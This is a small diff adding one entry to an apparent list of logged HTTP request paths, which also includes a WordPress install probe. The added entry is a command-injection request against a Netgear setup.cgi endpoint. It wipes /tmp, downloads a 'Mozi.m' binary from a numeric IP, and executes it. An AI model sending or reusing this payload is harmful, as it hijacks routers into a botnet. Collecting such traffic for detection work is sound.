@@ -25076,3 +25076,4 @@ HTTP/1.1
 /YTLlaXfThtAS
 /wordpress/wp-admin/install.php?step=1
 /order?srsltid=AfmBOoomP8mFKgWmBcJKr_kPxaZZ2PX9_asv9MWOlxs4SoV1Fcx6SxCv
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://171.37.44.189:51670/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
